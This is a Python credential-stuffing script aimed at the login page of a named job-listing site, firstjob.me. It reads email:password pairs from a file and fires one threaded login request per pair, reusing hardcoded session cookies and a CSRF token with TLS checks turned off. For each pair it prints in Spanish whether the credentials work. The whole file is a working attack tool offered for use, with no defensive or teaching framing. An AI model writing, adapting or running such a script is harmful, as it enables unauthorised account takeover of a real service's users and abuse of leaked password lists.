import threading
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time
from termcolor import colored

def run_request(email, password):

    url = "https://firstjob.me/usuarios/ingresar"
    payload = 'authenticity_token=UTsPkmQMiM0k%2B7YXxlMV92vP%2BUbb1NpVqI%2B7cRJjn%2B%2FYRrkqFCzghheXR9Xs2mlTIpnpEny8Zz9kZL5TbcymrA%3D%3D&user%5Bemail%5D='+email+'&user%5Bpassword%5D='+password
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'es-419,es;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': '_ga=GA1.2.611375164.1650428556; _gid=GA1.2.493774890.1650428556; _gat_gtag_UA_164980910_2=1; _firstjob_v2_session=KOMOEGQ7WmpEW48dFLOCsIGsZ%2FIyyOAVc8mL8iqccsyjTLXQaOUs6bWWmV2FJI%2FYmuoT2VxqVChAy8iPWytO%2FEQKwHhv%2FII%2FDN%2FlOpM2w%2B2%2F%2Fr1PX0wl3L5odXnn%2BVbgUrhuT%2BCnuETx7OX0G2pr575icuB%2FM%2FR4abBvKZsrOMTMki0%2F0emORmWqk3uibfahTPuAwNylzjh2BqMBftiFbRgak1xoVli8x4AuRacgoShaeyGDMuEjTl1iMxFtACAqtNhb%2BJodUqw9S26SaqWIj61l7NLSp6rji4KBGQ%3D%3D--coLiJ%2BRV7OOsJzUc--0Nw2NQmYnQiupkRfQ%2F0BQQ%3D%3D; _firstjob_v2_session=d8eV4PS62aD6zE8cSnQhPq%2FE7syjQiAzGUtSBu8Glv5cLnbvsf3sHDjE8%2BcuHVi%2BUltZqSKKlQ82MdEOlV%2F%2BSOx6p3fah5LJ1ThYUwgnw0Mw%2FdXpdrE%2FiFj8uSnbZX3Ge8aoTpTwp7c2m6iHaeEO5Q%2FFuBRGS9FORt%2BXEoFddT3%2FjCbHe%2FPzLXN8Oe4Xq%2F9rsIwTaCmEauPIRxJ6%2Fjgosjc9yuL0rlenBGbvr7RLgQGLvbpvPyype0NkJvaqTY6E2MKCJzhLvtj7uqnARMhcVZRtKTQI2Vbk7vVRuQ%3D%3D--O3%2FF8xgMg0I9WA26--Yvm8NHLZH%2BI9Bmhx1ieORw%3D%3D',
        'Origin': 'https://firstjob.me',
        'Referer': 'https://firstjob.me/usuarios/ingresar',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"'
    }

    response = requests.request("POST", url, headers=headers, data=payload, verify=False)
    if( response.text.split("\n")[82].strip() == '<strong>¡Atención!</strong> El usuario no existe en el sistema.'):
        text = 'email:password {0}:{1} NO FUNCIONAN'.format(email, password)
        print(colored(text, 'red'))
    else: 
        text = '>>>Email: {0} y Password: {1} SON CREDENCIALES VALIDAS<<<'.format(email, password)
        print(colored(text, 'green'))

def main():
    # perf_counter() function always returns the float value of time in seconds
    start = time.perf_counter()

    path_of_password_payload_text_file = input(
        "List of password payload: ").strip()

    list_of_threads = []

    # Open the file for reading
    with open(path_of_password_payload_text_file, "r") as a_file:

        for line in a_file:
            email, password = line.split(':')
            new_thread = threading.Thread(
                target=run_request, args=[email, password])
            new_thread.start()
            list_of_threads.append(new_thread)

        # Join all thread
        for thread in list_of_threads:
            thread.join()

    # Lets get the finish time of code run
    finish = time.perf_counter()

    print(f'\n\nFinished in {round(finish-start, 2)} second(s)\n')


if __name__ == '__main__':
    main()
